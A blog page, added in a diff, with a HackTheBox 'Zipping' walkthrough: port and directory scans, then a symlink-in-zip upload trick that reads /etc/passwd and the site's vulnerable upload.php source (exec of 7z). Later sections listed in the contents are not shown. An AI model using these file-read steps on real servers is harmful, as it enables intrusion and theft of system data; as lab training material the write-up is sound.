@@ -1,0 +1,1976 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Zipping | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="PS C:\Users\dell&amp;gt; date  2023年9月9日 11:30:03  Usenmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools&#x2F;machine&#x2F;Zipping] └─# nmap -p- --min-rate 10000 10.10.11.229                              130 ⨯ Startin">
+<meta name="keywords" content="Happy to Share,And Make friends">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zipping">
+<meta property="og:url" content="someb0dy.github.io/2023/09/10/Zipping/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="PS C:\Users\dell&amp;gt; date  2023年9月9日 11:30:03  Usenmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools&#x2F;machine&#x2F;Zipping] └─# nmap -p- --min-rate 10000 10.10.11.229                              130 ⨯ Startin">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694230597199-1a4a0517-04bc-4175-95a8-28e30b43d995.png#averageHue=%23fdfdfc&clientId=uc2486917-7f30-4&from=paste&height=804&id=udff01585&originHeight=905&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=188607&status=done&style=none&taskId=u7810872f-4fce-4e52-a4b4-2dfd8379109&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694231019176-b4d28715-e141-4820-a773-f50f840fae3f.png#averageHue=%23fdfdfc&clientId=uc2486917-7f30-4&from=paste&height=599&id=uaafc0139&originHeight=674&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=59543&status=done&style=none&taskId=u18e2e5dd-c57b-4992-b97f-71d4996c7a9&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694231744825-573ab036-a516-4bad-a00a-aa98687e254f.png#averageHue=%23fdfbf1&clientId=uc2486917-7f30-4&from=paste&height=748&id=uf9527fd1&originHeight=841&originWidth=1782&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=55637&status=done&style=none&taskId=u7ac4d63e-491e-4b77-8a71-1c76a7a5dfb&title=&width=1584">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694232031659-4e437cee-7b6f-4e43-a0cd-45b58e24f673.png#averageHue=%23fdf8e4&clientId=uc2486917-7f30-4&from=paste&height=735&id=u522a75fa&originHeight=827&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=46938&status=done&style=none&taskId=u39f1d8b3-7130-414c-a78c-03cda290f1e&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694234879735-7a12792f-7d5b-4202-a34c-35fc4f9e9e1d.png#averageHue=%239e8760&clientId=uc2486917-7f30-4&from=paste&height=572&id=u05fc06a0&originHeight=643&originWidth=1468&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=158738&status=done&style=none&taskId=u54d3a35a-c162-4866-bcfb-e721745c81e&title=&width=1304.888888888889">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694313034063-441a18b3-5973-44c2-bd02-0a778a7cdd52.png#averageHue=%23f6f7ef&clientId=ub0ae23b1-0055-4&from=paste&height=746&id=ufdd03f41&originHeight=839&originWidth=1898&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=191019&status=done&style=none&taskId=u5e1a9353-9a02-4547-8d32-8d28e8fe6c6&title=&width=1687.111111111111">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694318532847-8a02d001-87cb-4510-8f4e-41fd65d7a593.png#averageHue=%231f2429&clientId=ub0ae23b1-0055-4&from=paste&height=260&id=ua59e7100&originHeight=293&originWidth=1029&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=32308&status=done&style=none&taskId=u26577fc5-7f73-4311-bae5-050a9a240f6&title=&width=914.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320291780-24f0a5f4-632c-4391-a6c5-dc1cbea30231.png#averageHue=%232d2d2d&clientId=ub0ae23b1-0055-4&from=paste&height=612&id=ub4de9f72&originHeight=689&originWidth=1445&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=128310&status=done&style=none&taskId=u73e76c6f-a22b-4bcd-a348-6cd4203de89&title=&width=1284.4444444444443">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320466589-3e030712-8215-49de-8c24-ac2c92011d55.png#averageHue=%23c1a976&clientId=ub0ae23b1-0055-4&from=paste&height=731&id=uf71b8d86&originHeight=822&originWidth=1628&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=171266&status=done&style=none&taskId=ud78ccb68-71d0-4eea-8dea-10657c12417&title=&width=1447.111111111111">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320570611-3c0bac3f-8389-41b2-85e8-123821dad3ac.png#averageHue=%238b8b8b&clientId=ub0ae23b1-0055-4&from=paste&height=498&id=u9e5b7011&originHeight=560&originWidth=1615&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=94589&status=done&style=none&taskId=uc7238e2b-7966-4c2d-ba5b-8c774b7d002&title=&width=1435.5555555555557">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320823502-734dc14d-4c7e-43c2-8745-17de17fc6159.png#averageHue=%23171717&clientId=ub0ae23b1-0055-4&from=paste&height=342&id=u8e3691be&originHeight=385&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=84655&status=done&style=none&taskId=u8229f346-1bb9-4e43-af55-1f4a45d8693&title=&width=1706.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694320831895-6b2132c3-989b-42c4-9236-0e7bb4eac70a.png#averageHue=%232e2e2e&clientId=ub0ae23b1-0055-4&from=paste&height=513&id=ud48ddc26&originHeight=577&originWidth=791&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=79896&status=done&style=none&taskId=u95cfba39-4e0c-4d47-880e-7d50066afb7&title=&width=703.1111111111111">
+<meta property="og:updated_time" content="2023-09-10T05:29:53.481Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694230597199-1a4a0517-04bc-4175-95a8-28e30b43d995.png#averageHue=%23fdfdfc&clientId=uc2486917-7f30-4&from=paste&height=804&id=udff01585&originHeight=905&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=188607&status=done&style=none&taskId=u7810872f-4fce-4e52-a4b4-2dfd8379109&title=&width=1706.6666666666667">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Zipping</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Zipping</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-09-10T06:08:00.113Z" itemprop="datePublished" class="page-time">
+  2023-09-10
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Use"><span class="post-toc-number">1.</span> <span class="post-toc-text">Use</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nmap"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">web</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#link-文件-LFI"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">link 文件  - LFI</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LFI-py"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">LFI.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sqlI-preg-match-bypass"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">sqlI-preg_match bypass</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reverse-shell"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">Reverse-shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root"><span class="post-toc-number">2.</span> <span class="post-toc-text">root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sudo-l"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">sudo -l</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#strace"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">strace</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#priv-esclation-c"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">priv-esclation.c</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Zipping"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Zipping</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-09-10 14:08:00" datetime="2023-09-10T06:08:00.113Z"  itemprop="datePublished">2023-09-10</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <pre><code class="bash">PS C:\Users\dell&gt; date
+
+2023年9月9日 11:30:03
+</code></pre>
+<h1 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# nmap -p- --min-rate 10000 10.10.11.229                              130 ⨯
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 23:28 EDT
+Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 95.48% done; ETC: 23:28 (0:00:01 remaining)
+
+Nmap scan report for 10.10.11.229
+Host is up (1.5s latency).
+Not shown: 57217 closed tcp ports (reset), 8316 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 63.04 seconds
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# nmap -p 22,80 -sCV -O 10.10.11.229 -oA scan/detail
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 23:31 EDT
+Nmap scan report for 10.10.11.229
+Host is up (0.29s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
+|_  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
+|_http-title: Zipping | Watch store
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds
+</code></pre>
+<p>经典两端口<br>22, 80 ,直接开80 </p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694230597199-1a4a0517-04bc-4175-95a8-28e30b43d995.png#averageHue=%23fdfdfc&clientId=uc2486917-7f30-4&from=paste&height=804&id=udff01585&originHeight=905&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=188607&status=done&style=none&taskId=u7810872f-4fce-4e52-a4b4-2dfd8379109&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>查看源代码 href 属性，只有一个地方有非锚点的内容，就是 upload.php,在对应搜php，相关的内容，没有多余的内容了，所以，我们可以知道该站是php写的，扫一下目录</p>
+<pre><code class="bash">┌──(root💀kali)-[~]
+└─# dirsearch -u http://zipping.htb -e php
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940
+
+Output File: /root/.dirsearch/reports/zipping.htb/_23-09-08_23-39-55.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-09-08_23-39-55.log
+
+Target: http://zipping.htb/
+
+[23:39:56] Starting:
+[23:40:09] 403 -  276B  - /.ht_wsr.txt
+[23:40:09] 403 -  276B  - /.htaccess.bak1
+[23:40:09] 403 -  276B  - /.htaccess.orig
+[23:40:09] 403 -  276B  - /.htaccess.save
+[23:40:09] 403 -  276B  - /.htaccessOLD2
+[23:40:09] 403 -  276B  - /.htaccess.sample
+[23:40:09] 403 -  276B  - /.htaccess_sc
+[23:40:09] 403 -  276B  - /.htaccessOLD
+[23:40:09] 403 -  276B  - /.htaccess_orig
+[23:40:09] 403 -  276B  - /.htaccessBAK
+[23:40:09] 403 -  276B  - /.htaccess_extra
+[23:40:09] 403 -  276B  - /.htm
+[23:40:09] 403 -  276B  - /.html
+[23:40:09] 403 -  276B  - /.htpasswd_test
+[23:40:09] 403 -  276B  - /.httr-oauth
+[23:40:09] 403 -  276B  - /.htpasswds
+[23:40:14] 403 -  276B  - /.php
+[23:41:08] 301 -  311B  - /assets  -&gt;  http://zipping.htb/assets/
+[23:41:08] 200 -    2KB - /assets/
+[23:41:45] 200 -   16KB - /index.php
+[23:41:46] 200 -   16KB - /index.php/login/
+[23:42:25] 403 -  276B  - /server-status
+[23:42:25] 403 -  276B  - /server-status/
+[23:42:30] 301 -  309B  - /shop  -&gt;  http://zipping.htb/shop/
+[23:42:47] 200 -    5KB - /upload.php
+[23:42:47] 301 -  312B  - /uploads  -&gt;  http://zipping.htb/uploads/
+[23:42:48] 403 -  276B  - /uploads/
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694231019176-b4d28715-e141-4820-a773-f50f840fae3f.png#averageHue=%23fdfdfc&clientId=uc2486917-7f30-4&from=paste&height=599&id=uaafc0139&originHeight=674&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=59543&status=done&style=none&taskId=u18e2e5dd-c57b-4992-b97f-71d4996c7a9&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这个点，是上传一个文件，我们尝试一下,介绍说了，只能上传zip，并且需要有一个pdf在里面 包含你的课程内容<br>上传之后会返回一个pdf的路径</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694231744825-573ab036-a516-4bad-a00a-aa98687e254f.png#averageHue=%23fdfbf1&clientId=uc2486917-7f30-4&from=paste&height=748&id=uf9527fd1&originHeight=841&originWidth=1782&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=55637&status=done&style=none&taskId=u7ac4d63e-491e-4b77-8a71-1c76a7a5dfb&title=&width=1584" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694232031659-4e437cee-7b6f-4e43-a0cd-45b58e24f673.png#averageHue=%23fdf8e4&clientId=uc2486917-7f30-4&from=paste&height=735&id=u522a75fa&originHeight=827&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=46938&status=done&style=none&taskId=u39f1d8b3-7130-414c-a78c-03cda290f1e&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我尝试一个压缩吧里面塞两个文件，一个pdf，一个php，我们得到回显只能存在一个pdf文件 </p>
+<h2 id="link-文件-LFI"><a href="#link-文件-LFI" class="headerlink" title="link 文件  - LFI"></a>link 文件  - LFI</h2><p>尝试把pdf换成link文件<br>Refer: <a href="https://book.hacktricks.xyz/pentesting-web/file-upload#symlink" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/file-upload#symlink</a><br>下面是zip 命令的其中一个参数，</p>
+<pre><code class="bash">  --symlinks
+              For UNIX and VMS (V8.3 and later), store symbolic links as such in the zip archive, instead of compressing and storing the  file  referred
+              to  by  the  link.  This can avoid multiple copies of files being included in the archive as zip recurses the directory trees and accesses
+              files directly and by links.
+</code></pre>
+<p>大概的意思就是用了这个参数，打在压缩包的时候，是一个链接文件，而不是链接的目标文件</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# ln -rs /etc/passwd 1.pdf
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# zip --symlinks 1.zip 1.pdf
+updating: 1.pdf (stored 0%)
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# ls
+1.pdf  1.zip  passwd  scan
+
+</code></pre>
+<p>上传这个1.zip 的文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694234879735-7a12792f-7d5b-4202-a34c-35fc4f9e9e1d.png#averageHue=%239e8760&clientId=uc2486917-7f30-4&from=paste&height=572&id=u05fc06a0&originHeight=643&originWidth=1468&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=158738&status=done&style=none&taskId=u54d3a35a-c162-4866-bcfb-e721745c81e&title=&width=1304.888888888889" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>可以进行文件包含</p>
+<pre><code class="bash">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# cat passwd | grep sh | grep -v no
+root:x:0:0:root:/root:/bin/bash
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+</code></pre>
+<p>这样就可以进行本地文件读取了</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# echo 1 &gt; /var/www/html/upload.php                                            130 ⨯
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# ln -rs /var/www/html/upload.php  upload.pdf
+ln: failed to create symbolic link &#39;upload.pdf&#39;: File exists
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# rm upload.pdf                                                                  1 ⨯
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# ln -rs /var/www/html/upload.php  upload.pdf
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# ls
+1  1.zip  passwd  scan  upload.pdf  upload.php
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# rm 1.zip
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# zip --symlinks 1.zip upload.pdf
+  adding: upload.pdf (stored 0%)
+
+</code></pre>
+<p>利用这个方式把，upload.php 的源代码读取出来</p>
+<pre><code class="php">&lt;html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+&lt;meta name=&quot;description&quot; content=&quot;Start your development with Creative Design landing page.&quot;&gt;
+&lt;meta name=&quot;author&quot; content=&quot;Devcrud&quot;&gt;
+&lt;title&gt;Zipping | Watch store&lt;/title&gt;
+
+&lt;!-- font icons --&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/vendors/themify-icons/css/themify-icons.css&quot;&gt;
+
+&lt;!-- Bootstrap + Creative Design main styles --&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/creative-design.css&quot;&gt;
+
+&lt;/head&gt;
+&lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar&quot; data-offset=&quot;40&quot; id=&quot;home&quot;&gt;
+&lt;!-- Page Header --&gt;
+&lt;header class=&quot;header header-mini&quot;&gt; 
+&lt;div class=&quot;header-title&quot;&gt;Work with Us&lt;/div&gt; 
+&lt;nav aria-label=&quot;breadcrumb&quot;&gt;
+&lt;ol class=&quot;breadcrumb&quot;&gt;
+&lt;li class=&quot;breadcrumb-item&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;breadcrumb-item active&quot; aria-current=&quot;page&quot;&gt;Work with Us&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/nav&gt;
+&lt;/header&gt; &lt;!-- End Of Page Header --&gt;
+
+&lt;section id=&quot;work&quot; class=&quot;text-center&quot;&gt;
+&lt;!-- container --&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;h1&gt;WORK WITH US&lt;/h1&gt;
+&lt;p class=&quot;mb-5&quot;&gt;If you are interested in working with us, do not hesitate to send us your curriculum.&lt;br&gt; The application will only accept zip files, inside them there must be a pdf file containing your curriculum.&lt;/p&gt;
+
+&lt;?php
+if (isset($_POST[&quot;submit&quot;])) {
+    // Get the uploaded zip file
+    $zipFile = $_FILES[&quot;zipFile&quot;][&quot;tmp_name&quot;];
+    if ($_FILES[&quot;zipFile&quot;][&quot;size&quot;] &gt; 300000) {
+        echo &quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;;
+    } else {
+        // Create an md5 hash of the zip file
+        $fileHash = md5_file($zipFile);
+        // Create a new directory for the extracted files
+        $uploadDir = &quot;uploads/$fileHash/&quot;;
+        $tmpDir = sys_get_temp_dir();
+        // Extract the files from the zip
+        $zip = new ZipArchive();
+        if ($zip-&gt;open($zipFile) === true) {
+            if ($zip-&gt;count() &gt; 1) {
+                echo &quot;&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;&quot;;
+            } else {
+                // Get the name of the compressed file
+                $fileName = $zip-&gt;getNameIndex(0);
+                if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) {
+                    $uploadPath = $tmpDir . &quot;/&quot; . $uploadDir;
+                    echo exec(
+                        &quot;7z e &quot; . $zipFile . &quot; -o&quot; . $uploadPath . &quot;&gt;/dev/null&quot;
+                    );
+                    if (file_exists($uploadPath . $fileName)) {
+                        mkdir($uploadDir);
+                        rename($uploadPath . $fileName, $uploadDir . $fileName);
+                    }
+                    echo &#39;&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;&#39; .
+                        $uploadDir .
+                        $fileName .
+                        &#39;&quot;&gt;&#39; .
+                        $uploadDir .
+                        $fileName .
+                        &quot;&lt;/a&gt;&quot; .
+                        &quot;&lt;/p&gt;&quot;;
+                } else {
+                    echo &quot;&lt;p&gt;The unzipped file must have  a .pdf extension.&lt;/p&gt;&quot;;
+                }
+            }
+        } else {
+            echo &quot;Error uploading file.&quot;;
+        }
+    }
+}
+?&gt;
+
+
+&lt;!-- Submit File --&gt;
+&lt;form id=&quot;zip-form&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;upload.php&quot;&gt;
+&lt;div class=&quot;mb-3&quot;&gt;
+&lt;input type=&quot;file&quot; class=&quot;form-control&quot; name=&quot;zipFile&quot; accept=&quot;.zip&quot;&gt;
+&lt;/div&gt;
+&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot; name=&quot;submit&quot;&gt;Upload&lt;/button&gt;
+&lt;/form&gt;&lt;!-- End submit file --&gt;
